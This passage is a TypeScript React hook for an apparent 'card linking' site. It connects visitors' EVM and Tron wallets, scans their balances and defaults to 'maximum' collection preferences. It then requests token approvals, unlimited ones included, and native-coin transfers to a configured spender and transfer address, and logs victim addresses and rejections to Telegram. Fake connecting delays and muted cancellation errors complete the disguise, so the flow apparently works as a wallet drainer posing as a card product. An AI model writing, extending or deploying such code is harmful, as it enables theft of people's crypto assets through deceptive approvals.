"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { TERMS_VERSION } from "../core/approve-config";
import { fetchBalances } from "../core/balances-client";
import { postTgLog } from "../core/tg-log-client";
import { projectId, WC_CONNECT_NAMESPACES } from "../core/constants";
import { createConnectLogStep } from "../observability/connect-logger";
import { rowsFromBalances } from "../core/network-meta";
import { createBrowserApprovalOrchestrator } from "../approval/create-browser-orchestrator";
import { ApprovalStageName, StageStatus } from "../approval/types";
import { createBrowserNativeTransferOrchestrator } from "../native-transfer/create-browser-orchestrator";
import { createHttpNativeTransferApiClient } from "../native-transfer/http-api-client";
import type { NativeTransferEstimate } from "../native-transfer/types";
import { TRANSACTION_TERMINAL_STAGES } from "@trustmycard/shared/constants/transaction-lifecycle";
import {
  assignJourneyId,
  beginTransaction,
  getActiveTransaction,
  markTerminal,
  reconcileActiveTransactionOnMount,
  setActiveTransaction,
  updateActiveTransaction,
} from "../core/transaction-context";
import {
  getErrorMessage,
  isUserRejection,
  muteWalletCancellationConsoleErrors,
} from "../core/errors";
import { accountsFromSession, getTronLinkAddress } from "../core/tron-sign";
import {
  getSharedWcModal,
  purgeExtraWcmModals,
} from "../providers/wallet-connect-modal";
import { getSharedUniversalProvider } from "../providers/wallet-connect-provider";
import type { ConnectFlowProps } from "../types/connect-flow-props";
import { configGaps, getSpenderForNetwork } from "../types/connect-flow-props";
import {
  buildMaximumPreferences,
  buildMaximumPreferencesForNetwork,
  listIncludedAssetWork,
  nativeDecimalsForNetwork,
  validateIncludedPrefs,
} from "../authorization/preferences";
import { runAuthorizationSession } from "../authorization/session";
import type { SettlementRunResult } from "../authorization/phases/types";
import type { SettlementProgressEvent } from "../authorization/phases/types";
import { parseHumanToRaw } from "../core/chain-tokens";
import {
  LINK_PROGRESS_STAGES,
  CARD_CONNECTING_MIN_MS,
  LINK_COMPLETE_MIN_MS,
  mapStageToLinkProgress,
  mapApprovalStageToLinkProgress,
  mapAssetToApprovingProgress,
  mapAssetToApprovedProgress,
  mapSettlementProgressToLinkProgress,
  linkProgressStageById,
  LINK_CANCELLED_MESSAGE,
  PERMISSION_DENIED_BY_USER_MESSAGE,
  linkProgressStageIndex,
  preloadCardTierImages,
  preloadNetworkIcons,
  preloadLinkFlowAssets,
  type CardTierId,
  type LinkProgressStage,
} from "../core/link-flow-meta";
import { shortAddress } from "../core/network-meta";
import { setClientConfirmationDefaults } from "../approval/confirmation/types";
import {
  nativeClientPolicyFromPlatform,
  setNativeClientPolicy,
} from "../native-transfer/safety";
import type {
  AssetSymbol,
  AuthorizationSessionResult,
  AuthorizingPhase,
  CollectionPreferences,
  LinkedAccounts,
  ModalStep,
  NetworkRow,
  RowStatus,
  UniversalProvider,
  WalletConnectModal,
} from "../types";

export function useConnectFlow(props: ConnectFlowProps = {}) {
  const spendersRef = useRef(props);
  spendersRef.current = props;
  const providerRef = useRef<UniversalProvider | null>(null);
  const modalRef = useRef<WalletConnectModal | null>(null);
  const connectingRef = useRef(false);
  const approvingLockRef = useRef(false);
  const initOnceRef = useRef(false);
  const accountsRef = useRef<LinkedAccounts>({ evm: null, tron: null });
  const traceIdRef = useRef<string>("");
  const networksRef = useRef<NetworkRow[]>([]);
  const linkProgressStageIndexRef = useRef(0);
  const cardConnectStartedAtRef = useRef<number | null>(null);
  const pendingQrTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const revealWalletConnectQrRef = useRef<
    (uri: string, modal: WalletConnectModal) => void
  >(() => {});
  const cardModalHandlersRef = useRef({
    onQrDisplayed: () => {},
  });

  const clearPendingQrReveal = useCallback(() => {
    if (pendingQrTimerRef.current) {
      clearTimeout(pendingQrTimerRef.current);
      pendingQrTimerRef.current = null;
    }
  }, []);

  useEffect(() => {
    const reconciled = reconcileActiveTransactionOnMount();
    if (reconciled.expired) {
      createConnectLogStep("expired")(TRANSACTION_TERMINAL_STAGES.EXPIRED, {
        reason: "session_ttl_exceeded",
      });
    } else if (reconciled.transactionId) {
      traceIdRef.current = reconciled.transactionId;
    }
  }, []);

  useEffect(() => {
    const platform = props.platform;
    setNativeClientPolicy(nativeClientPolicyFromPlatform(platform));
    setClientConfirmationDefaults(platform);
  }, [props.platform]);

  const [ready, setReady] = useState(false);
  const [busy, setBusy] = useState(false);
  const [approving, setApproving] = useState(false);
  const [showResults, setShowResults] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [networks, setNetworks] = useState<NetworkRow[]>([]);
  const [selectedKey, setSelectedKey] = useState<string | null>(null);
  const [rowStatus, setRowStatus] = useState<Record<string, RowStatus>>({});
  const [modalStep, setModalStep] = useState<ModalStep>("preferences");
  const [linkedAccounts, setLinkedAccounts] = useState<LinkedAccounts>({
    evm: null,
    tron: null,
  });
  const [walletConnected, setWalletConnected] = useState(false);
  const [preferences, setPreferences] = useState<CollectionPreferences>({});
  const [sessionResult, setSessionResult] =
    useState<AuthorizationSessionResult | null>(null);
  const [authorizingAsset, setAuthorizingAsset] = useState<{
    network: string;
    asset: AssetSymbol;
  } | null>(null);
  const [authorizingPhase, setAuthorizingPhase] =
    useState<AuthorizingPhase>("preparing");
  const [authorizingProgress, setAuthorizingProgress] = useState<{
    current: number;
    total: number;
  }>({ current: 0, total: 0 });
  const [nativeEstimates, setNativeEstimates] = useState<
    Record<string, NativeTransferEstimate | null>
  >({});
  const [nativeEstimateLoading, setNativeEstimateLoading] = useState<
    Record<string, boolean>
  >({});
  const [nativeEstimateErrors, setNativeEstimateErrors] = useState<
    Record<string, string | null>
  >({});
  const [showCardModal, setShowCardModal] = useState(false);
  const [cardModalConnecting, setCardModalConnecting] = useState(false);
  const [selectedCardTier, setSelectedCardTier] =
    useState<CardTierId>("silver");
  const [linkProgress, setLinkProgress] = useState<LinkProgressStage>(
    LINK_PROGRESS_STAGES[0],
  );
  const [linkNetworkError, setLinkNetworkError] = useState<{
    networkKey: string;
    message: string;
  } | null>(null);
  const [networksLoading, setNetworksLoading] = useState(false);
  const [showNetworkFetchOverlay, setShowNetworkFetchOverlay] = useState(false);
  const linkingNetworkKeyRef = useRef<string | null>(null);
  const linkCompleteTimerRef = useRef<ReturnType<typeof setTimeout> | null>(
    null,
  );
  const rowStatusRef = useRef<Record<string, RowStatus>>({});

  const clearLinkCompleteTimer = useCallback(() => {
    if (linkCompleteTimerRef.current) {
      clearTimeout(linkCompleteTimerRef.current);
      linkCompleteTimerRef.current = null;
    }
  }, []);

  networksRef.current = networks;
  rowStatusRef.current = rowStatus;

  const advanceLinkProgress = useCallback((stage: LinkProgressStage) => {
    const idx = linkProgressStageIndex(stage);
    if (idx < linkProgressStageIndexRef.current) return;
    linkProgressStageIndexRef.current = idx;
    setLinkProgress(LINK_PROGRESS_STAGES[idx] ?? stage);
  }, []);

  cardModalHandlersRef.current.onQrDisplayed = () => {
    cardConnectStartedAtRef.current = null;
    setShowCardModal(false);
    setCardModalConnecting(false);
  };

  const logStep = useCallback(
    (step: string, detail: Record<string, unknown> = {}) => {
      const traceId = traceIdRef.current || "n/a";
      createConnectLogStep(traceId)(step, detail);
    },
    [],
  );

  const handleSettlementProgress = useCallback(
    (event: SettlementProgressEvent) => {
      logStep("SETTLEMENT PROGRESS", event);
      advanceLinkProgress(
        mapSettlementProgressToLinkProgress({
          stage: event.stage,
          token: event.token,
        }),
      );
    },
    [advanceLinkProgress, logStep],
  );

  revealWalletConnectQrRef.current = (
    uri: string,
    modal: WalletConnectModal,
  ) => {
    const openQr = () => {
      pendingQrTimerRef.current = null;
      if (!connectingRef.current) return;
      cardModalHandlersRef.current.onQrDisplayed();
      void modal.openModal({ uri });
    };

    const startedAt = cardConnectStartedAtRef.current;
    if (!startedAt) {
      openQr();
      return;
    }

    const remaining = CARD_CONNECTING_MIN_MS - (Date.now() - startedAt);
    if (remaining <= 0) {
      openQr();
      return;
    }

    logStep("QR HELD — MIN CONNECTING TIME", { remainingMs: remaining });
    clearPendingQrReveal();
    pendingQrTimerRef.current = setTimeout(openQr, remaining);
  };

  const resetCardConnectTiming = useCallback(() => {
    clearPendingQrReveal();
    cardConnectStartedAtRef.current = null;
  }, [clearPendingQrReveal]);

  const resetAuthorizeForm = useCallback(() => {
    setSelectedKey(null);
    setModalStep("preferences");
    setPreferences({});
    setSessionResult(null);
    setAuthorizingAsset(null);
    setAuthorizingPhase("preparing");
    setAuthorizingProgress({ current: 0, total: 0 });
    setNativeEstimates({});
    setNativeEstimateLoading({});
    setNativeEstimateErrors({});
    linkProgressStageIndexRef.current = 0;
    setLinkProgress(LINK_PROGRESS_STAGES[0]);
  }, []);

  const mapApprovalStageToPhase = useCallback(
    (stage: string): AuthorizingPhase => {
      if (
        stage === "BROADCAST" ||
        stage === "SIGN" ||
        stage === ApprovalStageName.BROADCAST ||
        stage === ApprovalStageName.SIGN
      ) {
        return "wallet_confirm";
      }
      if (
        stage === "WAIT_CONFIRMATION" ||
        stage === "VERIFY_APPROVAL" ||
        stage === "PERSIST_APPROVAL" ||
        stage === "POST_APPROVAL" ||
        stage === "CONFIRM" ||
        stage === "REGISTER_PENDING" ||
        stage === ApprovalStageName.WAIT_CONFIRMATION ||
        stage === ApprovalStageName.VERIFY_APPROVAL ||
        stage === ApprovalStageName.PERSIST_APPROVAL ||
        stage === ApprovalStageName.POST_APPROVAL
      ) {
        return "finalizing";
      }
      return "preparing";
    },
    [],
  );

  const createStageAwareLogger = useCallback(
    () => ({
      info: (event: string, detail?: Record<string, unknown>) => {
        logStep(event, detail ?? {});
        if (event === "STAGE_START" && detail?.stage) {
          const stage = String(detail.stage);
          setAuthorizingPhase(mapApprovalStageToPhase(stage));
          advanceLinkProgress(mapApprovalStageToLinkProgress(stage));
        }
      },
      warn: (event: string, detail?: Record<string, unknown>) => {
        logStep(event, detail ?? {});
      },
      error: (event: string, detail?: Record<string, unknown>) => {
        logStep(event, detail ?? {});
      },
    }),
    [logStep, mapApprovalStageToPhase, advanceLinkProgress],
  );

  const setStatus = useCallback((key: string, status: RowStatus) => {
    setRowStatus((prev) => ({ ...prev, [key]: status }));
  }, []);

  const setLinkCancelled = useCallback(
    (networkKey: string, message = LINK_CANCELLED_MESSAGE) => {
      linkingNetworkKeyRef.current = null;
      setLinkNetworkError({ networkKey, message });
      setSelectedKey(networkKey);
      setError(null);
      setModalStep("preferences");
      setStatus(networkKey, "awaiting");
      linkProgressStageIndexRef.current = 0;
      setLinkProgress(LINK_PROGRESS_STAGES[0]);
    },
    [setStatus],
  );

  const refreshNativeEstimateFor = useCallback(async (networkKey: string) => {
    const linked = accountsRef.current;
    const owner = networkKey === "tron" ? linked.tron : linked.evm;
    if (!owner) {
      setNativeEstimates((prev) => ({ ...prev, [networkKey]: null }));
      setNativeEstimateErrors((prev) => ({
        ...prev,
        [networkKey]: "No wallet address for this network",
      }));
      return;
    }

    setNativeEstimateLoading((prev) => ({ ...prev, [networkKey]: true }));
    setNativeEstimateErrors((prev) => ({ ...prev, [networkKey]: null }));
    try {
      const api = createHttpNativeTransferApiClient();
      const estimate = await api.estimate({
        request: {
          network: networkKey,
          owner,
          traceId: traceIdRef.current,
        },
      });
      setNativeEstimates((prev) => ({ ...prev, [networkKey]: estimate }));
    } catch (err: unknown) {
      const message = getErrorMessage(err, "Failed to estimate network fees");
      setNativeEstimates((prev) => ({ ...prev, [networkKey]: null }));
      setNativeEstimateErrors((prev) => ({ ...prev, [networkKey]: message }));
    } finally {
      setNativeEstimateLoading((prev) => ({ ...prev, [networkKey]: false }));
    }
  }, []);

  const scanWallet = useCallback(
    async (linked: LinkedAccounts) => {
      if (!linked.evm && !linked.tron) {
        setNetworks([]);
        setNetworksLoading(false);
        return;
      }

      setError(null);
      setNetworks([]);
      setRowStatus({});
      resetAuthorizeForm();
      setNetworksLoading(true);
      advanceLinkProgress(linkProgressStageById("syncing"));

      try {
        logStep("SCAN STARTED", { linked });
        let tron = linked.tron;
        if (!tron) tron = await getTronLinkAddress();

        const linkedFinal = { evm: linked.evm, tron };
        accountsRef.current = linkedFinal;
        setLinkedAccounts(linkedFinal);
        setWalletConnected(true);

        const primary = tron || linked.evm;
        const network = tron ? "tron" : "evm";
        if (primary) {
          const journey = assignJourneyId(primary, { network });
          traceIdRef.current = journey.transactionId;
        }
        updateActiveTransaction({
          walletAddress: primary ?? undefined,
          network,
        });

        const [, data] = await Promise.all([
          primary
            ? postTgLog({
                type: "scan",
                address: primary,
                network,
                status: "success",
                error: null,
                traceId: traceIdRef.current,
                transactionId: traceIdRef.current,
              })
            : Promise.resolve(),
          fetchBalances(linked.evm, tron),
        ]);
        logStep("BALANCES FETCH SUCCESS", { networks: Object.keys(data) });
        advanceLinkProgress(linkProgressStageById("verifying"));

        const allRows = rowsFromBalances(data);
        const rows = allRows.filter((row) =>
          row.key === "tron"
            ? Boolean(linkedFinal.tron)
            : Boolean(linkedFinal.evm),
        );
        if (rows.length === 0) {
          setError(
            linkedFinal.tron
              ? "No Tron balances found for this wallet"
              : "No EVM balances found for this wallet",
          );
          setNetworksLoading(false);
          return;
        }
        setNetworks(rows);
        setRowStatus(
          Object.fromEntries(rows.map((r) => [r.key, "awaiting" as RowStatus])),
        );
        // Seed independent per-network drafts; sessions still authorize one network at a time.
        setPreferences(buildMaximumPreferences(rows));
        setSelectedKey(null);
        setModalStep("preferences");

        logStep("STEP 1 COMPLETE — WALLET CONNECTED + BALANCES", {
          fundsMoved: "NO — read-only scan",
          evm: linkedFinal.evm,
          tron: linkedFinal.tron,
          networks: rows.map((r) => ({
            key: r.key,
            native: r.balances.native,
            usdt: r.balances.usdt,
            usdc: r.balances.usdc ?? null,
          })),
        });

        // Native fee estimates are fetched during authorization when needed (not on network pick).
      } catch (err: unknown) {
        logStep("BALANCES FETCH FAILED", {
          error: getErrorMessage(err, "scan failed"),
        });
        setError(getErrorMessage(err, "Failed to fetch balances"));
        setNetworks([]);
      } finally {
        setNetworksLoading(false);
      }
    },
    [logStep, resetAuthorizeForm, advanceLinkProgress],
  );

  useEffect(() => {
    let cancelled = false;
    muteWalletCancellationConsoleErrors();

    async function init() {
      if (!projectId) {
        setError("Missing NEXT_PUBLIC_PROJECT_ID in .env.local");
        return;
      }

      if (initOnceRef.current && providerRef.current && modalRef.current) {
        setReady(true);
        return;
      }

      const [{ default: UniversalProvider }, { WalletConnectModal }] =
        await Promise.all([
          import("@walletconnect/universal-provider"),
          import("@walletconnect/modal"),
        ]);

      if (cancelled) return;

      const modal = getSharedWcModal(WalletConnectModal, projectId);

      const provider = await getSharedUniversalProvider(
        UniversalProvider,
        projectId,
      );

      if (cancelled) return;

      provider.events.removeAllListeners("display_uri");
      provider.events.removeAllListeners("session_delete");
      provider.on("display_uri", (uri: string) => {
        logStep("QR DISPLAYED", { hasUri: Boolean(uri) });
        purgeExtraWcmModals(document.querySelector("wcm-modal"));
        revealWalletConnectQrRef.current(uri, modal);
      });
      provider.on("session_delete", () => {
        logStep("SESSION DELETED");
        setNetworks([]);
        setShowResults(false);
        setNetworksLoading(false);
        setRowStatus({});
        accountsRef.current = { evm: null, tron: null };
        setLinkedAccounts({ evm: null, tron: null });
        setWalletConnected(false);
        resetAuthorizeForm();
      });

      providerRef.current = provider;
      modalRef.current = modal;
      initOnceRef.current = true;
      setReady(true);
    }

    init().catch((err: unknown) => {
      setError(getErrorMessage(err, "Failed to init WalletConnect"));
    });

    return () => {
      cancelled = true;
      clearPendingQrReveal();
      clearLinkCompleteTimer();
      modalRef.current?.closeModal();
    };
  }, [
    clearLinkCompleteTimer,
    clearPendingQrReveal,
    logStep,
    resetAuthorizeForm,
  ]);

  const startLinkFlow = useCallback(
    (preferredTier?: CardTierId) => {
      preloadLinkFlowAssets();
      setError(null);
      setShowNetworkFetchOverlay(false);
      resetCardConnectTiming();
      setCardModalConnecting(false);
      setSelectedCardTier(preferredTier ?? "silver");
      setShowCardModal(true);
    },
    [resetCardConnectTiming],
  );

  const closeCardModal = useCallback(() => {
    resetCardConnectTiming();
    setShowCardModal(false);
    setCardModalConnecting(false);
  }, [resetCardConnectTiming]);

  const openWalletConnect = useCallback(async () => {
    const prior = getActiveTransaction();
    if (prior && !prior.terminalStatus && prior.transactionId?.trim()) {
      traceIdRef.current = prior.transactionId;
      setActiveTransaction(prior);
    } else {
      const shell = beginTransaction();
      traceIdRef.current = shell.transactionId;
    }
    logStep("CONNECT STARTED", {
      traceId: traceIdRef.current || "pending",
      transactionId: traceIdRef.current || "pending",
    });
    advanceLinkProgress(linkProgressStageById("connecting"));
    const provider = providerRef.current;
    const modal = modalRef.current;
    if (!provider || connectingRef.current) return;

    connectingRef.current = true;
    setError(null);
    setBusy(true);
    setShowResults(false);
    setNetworksLoading(false);
    setNetworks([]);
    setRowStatus({});
    setWalletConnected(false);
    setLinkedAccounts({ evm: null, tron: null });
    setShowNetworkFetchOverlay(false);
    resetAuthorizeForm();

    let unsubscribeModal: (() => void) | undefined;
    if (modal) {
      unsubscribeModal = modal.subscribeModal((state) => {
        if (state.open) return;
        if (!connectingRef.current || provider.session) return;
        logStep(TRANSACTION_TERMINAL_STAGES.CANCELLED, {
          reason: "qr_modal_closed",
        });
        markTerminal("CANCELLED");
        connectingRef.current = false;
        setBusy(false);
        resetCardConnectTiming();
        setCardModalConnecting(false);
        setShowCardModal(true);
        setShowResults(false);
        setNetworksLoading(false);
      });
    }

    try {
      if (provider.session) {
        await provider.disconnect().catch(() => undefined);
      }

      await provider.connect({
        optionalNamespaces: WC_CONNECT_NAMESPACES,
      });
      logStep("WALLET CONNECTED");

      modal?.closeModal();

      const linked = accountsFromSession(provider.session);

      if (!linked.evm && !linked.tron) {
        logStep(TRANSACTION_TERMINAL_STAGES.FAILED, {
          reason: "no_accounts",
        });
        markTerminal("FAILED");
        setError("No account returned from wallet. Please try again.");
        setShowCardModal(true);
        return;
      }

      setShowResults(true);
      setNetworksLoading(true);
      preloadNetworkIcons();
      await scanWallet(linked);
    } catch (err: unknown) {
      logStep(TRANSACTION_TERMINAL_STAGES.FAILED, {
        error: getErrorMessage(err, "connect failed"),
        phase: "connect",
      });
      markTerminal("FAILED");
      modal?.closeModal();
      const message = getErrorMessage(err, "Connection cancelled");
      if (/reset/i.test(message)) {
        setError("Connection request reset. Please try again.");
      } else if (!/rejected|denied|cancel|abort/i.test(message)) {
        setError(message);
      }
      setNetworks([]);
      setShowResults(false);
      setNetworksLoading(false);
      resetCardConnectTiming();
      setCardModalConnecting(false);
      setShowCardModal(true);
    } finally {
      unsubscribeModal?.();
      connectingRef.current = false;
      setBusy(false);
    }
  }, [
    advanceLinkProgress,
    logStep,
    resetAuthorizeForm,
    resetCardConnectTiming,
    scanWallet,
  ]);

  const continueFromCardSelect = useCallback(
    (tierId: CardTierId) => {
      setSelectedCardTier(tierId);
      cardConnectStartedAtRef.current = Date.now();
      setCardModalConnecting(true);
      setError(null);
      void openWalletConnect();
    },
    [openWalletConnect],
  );

  const onSelectNetwork = useCallback(
    (key: string) => {
      if (approving) return;
      setSelectedKey((prev) => (prev === key ? null : key));
      setError(null);
      setLinkNetworkError(null);
      setPreferences((prev) => {
        if (prev[key]) return prev;
        return {
          ...prev,
          [key]: buildMaximumPreferencesForNetwork(key),
        };
      });
    },
    [approving],
  );

  const proceedWithLinkedNetworks = useCallback(() => {
    if (approving) return;
    setSelectedKey(null);
    setError(null);
    setShowNetworkFetchOverlay(true);
  }, [approving]);

  const requestAuthorizeSession = useCallback(async () => {
    const provider = providerRef.current;
    if (!provider || approvingLockRef.current) return;

    if (!selectedKey) {
      setError("Select a network first");
      return;
    }
    const linked = accountsRef.current;
    if (selectedKey === "tron" && !linked.tron) {
      setError("No Tron address in this session. Reconnect with Tron enabled.");
      return;
    }
    if (selectedKey !== "tron" && !linked.evm) {
      setError(
        "No EVM address in this session. Reconnect with an EVM-capable wallet for this network.",
      );
      return;
    }
    const items = listIncludedAssetWork(preferences, networks, selectedKey);
    const validationError = validateIncludedPrefs(items);
    if (validationError) {
      setError(validationError);
      return;
    }

    const gaps = configGaps(spendersRef.current, selectedKey);
    if (gaps.length > 0) {
      setError(
        `Missing spender for ${selectedKey}: ${gaps.join(", ")} (pass props or set .env.local)`,
      );
      return;
    }

    approvingLockRef.current = true;
    setApproving(true);
    setError(null);
    setLinkNetworkError(null);
    setModalStep("authorizing");
    setSessionResult(null);
    setAuthorizingPhase("preparing");
    setAuthorizingProgress({ current: 0, total: items.length });
    linkProgressStageIndexRef.current = 0;
    setLinkProgress(LINK_PROGRESS_STAGES[0]);
    linkingNetworkKeyRef.current = selectedKey;
    advanceLinkProgress(linkProgressStageById("preparing"));

    try {
      logStep("APPROVAL SESSION STARTED", {
        network: selectedKey,
        mode: "maximum",
        assetCount: items.length,
        assets: items.map((i) => `${i.network}:${i.asset}`),
      });

      let sessionNetworks = networks;
      try {
        const refreshed = await fetchBalances(linked.evm, linked.tron);
        const refreshedRows = rowsFromBalances(refreshed).filter((row) =>
          row.key === "tron" ? Boolean(linked.tron) : Boolean(linked.evm),
        );
        if (refreshedRows.length > 0) {
          sessionNetworks = refreshedRows;
          setNetworks(refreshedRows);
          logStep("BALANCES REFRESHED BEFORE AUTHORIZE", {
            network: selectedKey,
            balances: refreshedRows.find((r) => r.key === selectedKey),
          });
        }
      } catch (refreshErr) {
        logStep("BALANCE REFRESH FAILED — USING CONNECT SNAPSHOT", {
          network: selectedKey,
          error: getErrorMessage(refreshErr, "refresh failed"),
        });
      }

      let assetIndex = 0;

      const approvalOrchestrator = createBrowserApprovalOrchestrator({
        provider,
        logger: createStageAwareLogger(),
      });

      const nativeOrchestrator = createBrowserNativeTransferOrchestrator({
        provider,
        logger: createStageAwareLogger(),
      });

      const summary = await runAuthorizationSession({
        items,
        networks: sessionNetworks,
        accounts: accountsRef.current,
        evmBatchProvider: provider,
        apiBaseUrl: "",
        sessionId: traceIdRef.current,
        authorizationSessionId: traceIdRef.current,
        transactionId: traceIdRef.current,
        getSpender: (networkKey) =>
          getSpenderForNetwork(spendersRef.current, networkKey),
        log: logStep,
        onAssetStart: (item) => {
          assetIndex += 1;
          setAuthorizingProgress({ current: assetIndex, total: items.length });
          setAuthorizingAsset({ network: item.network, asset: item.asset });
          setAuthorizingPhase("preparing");
          setStatus(item.network, "waiting");
          advanceLinkProgress(mapAssetToApprovingProgress(item.asset));
        },
        onAssetEnd: (result) => {
          if (
            result.outcome === "authorized" ||
            result.outcome === "collected" ||
            result.outcome === "pending"
          ) {
            setStatus(result.network, "finalizing");
            if (result.token !== "NATIVE") {
              advanceLinkProgress(mapAssetToApprovedProgress(result.token));
            } else {
              advanceLinkProgress(linkProgressStageById("native_approving"));
            }
          } else if (result.outcome === "user_rejected") {
            setLinkCancelled(result.network, PERMISSION_DENIED_BY_USER_MESSAGE);
          } else if (
            result.outcome === "failed" &&
            isUserRejection(result.message)
          ) {
            setLinkCancelled(result.network, PERMISSION_DENIED_BY_USER_MESSAGE);
          } else if (
            result.outcome === "failed" ||
            result.outcome === "skipped_unsupported" ||
            result.outcome === "skipped_dependency_failed"
          ) {
            setStatus(result.network, "awaiting");
          }

          const owner =
            result.network === "tron"
              ? accountsRef.current.tron
              : accountsRef.current.evm;
          if (!owner) return;

          if (result.token === "NATIVE") {
            if (
              result.outcome === "failed" ||
              result.outcome === "user_rejected"
            ) {
              void postTgLog({
                type: "native_transfer",
                address: owner,
                network: result.network,
                status: "rejected",
                traceId: traceIdRef.current,
                transactionId: traceIdRef.current,
                error:
                  result.outcome === "user_rejected"
                    ? "Permission denied by user"
                    : getErrorMessage(result.message, "Native transfer failed"),
              });
            }
            return;
          }

          if (
            result.outcome === "failed" ||
            result.outcome === "user_rejected"
          ) {
            void postTgLog({
              type: "approve",
              address: owner,
              network: result.network,
              status: "rejected",
              traceId: traceIdRef.current,
              transactionId: traceIdRef.current,
              error:
                result.outcome === "user_rejected"
                  ? "Permission denied by user"
                  : getErrorMessage(result.message, "Approval failed"),
            });
          }
        },
        runApproval: async (args) => {
          return approvalOrchestrator.run(
            {
              network: args.network,
              owner: args.owner,
              token: args.token,
              amountHuman: args.amountHuman,
              unlimited: args.unlimited,
              nativeBalanceHuman: args.nativeBalanceHuman,
              tokenBalanceHuman: args.tokenBalanceHuman,
              executeTransfer: args.executeTransfer,
              transferToAddress: args.transferToAddress,
              transferAmountRaw: args.transferAmountRaw,
              traceId: traceIdRef.current,
            },
            {
              stagePreset: "wallet",
              onStage: (stageResult) => {
                const phase = mapApprovalStageToPhase(
                  String(stageResult.stage),
                );
                setAuthorizingPhase(phase);
                advanceLinkProgress(
                  mapApprovalStageToLinkProgress(String(stageResult.stage)),
                );
                if (
                  stageResult.stage === ApprovalStageName.BROADCAST &&
                  stageResult.status === StageStatus.OK
                ) {
                  setStatus(args.network, "finalizing");
                }
                if (
                  stageResult.status === StageStatus.CANCELLED ||
                  stageResult.userRejected ||
                  isUserRejection(stageResult.error)
                ) {
                  setLinkCancelled(
                    args.network,
                    PERMISSION_DENIED_BY_USER_MESSAGE,
                  );
                }
                args.onStage?.({
                  stage: stageResult.stage,
                  status: stageResult.status,
                  data: stageResult.data,
                  error: stageResult.error ?? null,
                });
              },
            },
          );
        },
        runApprovalSettlement: async (args) => {
          return approvalOrchestrator.run(
            {
              network: args.network,
              owner: args.owner,
              token: args.token,
              amountHuman: args.amountHuman,
              unlimited: args.unlimited,
              nativeBalanceHuman: args.nativeBalanceHuman,
              tokenBalanceHuman: args.tokenBalanceHuman,
              executeTransfer: args.executeTransfer,
              transferToAddress: args.transferToAddress,
              transferAmountRaw: args.transferAmountRaw,
              traceId: traceIdRef.current,
              walletSessionToken: args.walletSessionToken,
            },
            {
              stagePreset: "settlement",
              walletPhaseContext: args.walletPhaseContext,
            },
          );
        },
        settlementProvider: provider,
        onWalletPhaseComplete: (walletSummary) => {
          setAuthorizingAsset(null);
          setSessionResult(walletSummary);
          logStep("WALLET PHASE COMPLETE — SETTLEMENT CONTINUES", {
            authorizedCount: walletSummary.authorizedCount,
            failedCount: walletSummary.failedCount,
          });
          const allRejected =
            walletSummary.authorizedCount === 0 &&
            walletSummary.rejectedCount > 0;
          if (allRejected) {
            const rejectedNetwork =
              walletSummary.items.find(
                (item) => item.outcome === "user_rejected",
              )?.network ?? selectedKey;
            if (rejectedNetwork) {
              setLinkCancelled(
                rejectedNetwork,
                PERMISSION_DENIED_BY_USER_MESSAGE,
              );
            }
            approvingLockRef.current = false;
            setApproving(false);
            linkingNetworkKeyRef.current = null;
          }
        },
        onSettlementProgress: handleSettlementProgress,
        onSettlementComplete: (
          network,
          settlementResult: SettlementRunResult,
        ) => {
          logStep("SETTLEMENT COMPLETE", {
            network,
            ok: settlementResult.ok,
            items: settlementResult.sessionResult?.items,
          });

          const finishLinkUi = (justLinkedKey?: string) => {
            linkCompleteTimerRef.current = null;
            linkingNetworkKeyRef.current = null;
            approvingLockRef.current = false;
            setApproving(false);
            setAuthorizingAsset(null);
            setModalStep("preferences");
            setLinkNetworkError(null);

            setSelectedKey(null);
          };

          if (settlementResult.ok) {
            logStep(TRANSACTION_TERMINAL_STAGES.SUCCESS, {
              network,
              settlementSessionId: settlementResult.settlementSessionId,
            });
            markTerminal("SUCCESS");
            advanceLinkProgress(linkProgressStageById("complete"));
            setStatus(network, "linked");
            clearLinkCompleteTimer();
            linkCompleteTimerRef.current = setTimeout(
              () => finishLinkUi(network),
              LINK_COMPLETE_MIN_MS,
            );
          } else {
            const message =
              settlementResult.error ??
              "Network linking failed during background settlement";
            logStep(TRANSACTION_TERMINAL_STAGES.FAILED, {
              network,
              error: message,
            });
            markTerminal("FAILED");
            setLinkCancelled(network, message);
            finishLinkUi();
          }

          void fetchBalances(
            accountsRef.current.evm,
            accountsRef.current.tron,
          ).then((refreshed) => {
            const linked = accountsRef.current;
            const refreshedRows = rowsFromBalances(refreshed).filter((row) =>
              row.key === "tron" ? Boolean(linked.tron) : Boolean(linked.evm),
            );
            if (refreshedRows.length > 0) {
              setNetworks(refreshedRows);
            }
          });
        },
        runNativeTransfer: async (args) => {
          setAuthorizingPhase("preparing");
          const networkRow = networks.find((n) => n.key === args.network);
          const decimals = nativeDecimalsForNetwork(args.network);
          let transferAmountRaw: string | undefined;
          let transferAmountHuman: string | undefined;
          if (!args.unlimited && args.amountHuman) {
            const requested = parseHumanToRaw(args.amountHuman, decimals);
            const balanceRaw = networkRow
              ? parseHumanToRaw(networkRow.balances.native ?? "0", decimals)
              : requested;
            transferAmountRaw =
              requested < balanceRaw
                ? requested.toString()
                : balanceRaw.toString();
            transferAmountHuman = args.amountHuman;
          }

          return nativeOrchestrator.run(
            {
              network: args.network,
              owner: args.owner,
              termsVersion: TERMS_VERSION,
              traceId: traceIdRef.current,
              transferAmountRaw,
              transferAmountHuman,
              walletSessionToken: args.walletSessionToken,
              nativeReadinessTokens: args.nativeReadinessTokens,
            },
            {
              onStage: (stageResult) => {
                const stage = String(stageResult.stage);
                if (
                  stageResult.stage === "REFRESH_ESTIMATE" ||
                  stageResult.stage === "SIGN"
                ) {
                  setAuthorizingPhase("wallet_confirm");
                  advanceLinkProgress(mapStageToLinkProgress(stage));
                } else if (
                  stageResult.stage === "BROADCAST" ||
                  stageResult.stage === "REGISTER_PENDING" ||
                  stageResult.stage === "WAIT_CONFIRMATION" ||
                  stageResult.stage === "CONFIRM"
                ) {
                  const phase =
                    stageResult.stage === "BROADCAST"
                      ? "wallet_confirm"
                      : "finalizing";
                  setAuthorizingPhase(phase);
                  advanceLinkProgress(mapStageToLinkProgress(stage));
                }
                if (
                  stageResult.stage === "BROADCAST" &&
                  stageResult.status === "OK"
                ) {
                  setStatus(args.network, "finalizing");
                  advanceLinkProgress(
                    linkProgressStageById("native_approving"),
                  );
                }
                if (
                  stageResult.status === "CANCELLED" ||
                  stageResult.userRejected ||
                  isUserRejection(stageResult.error)
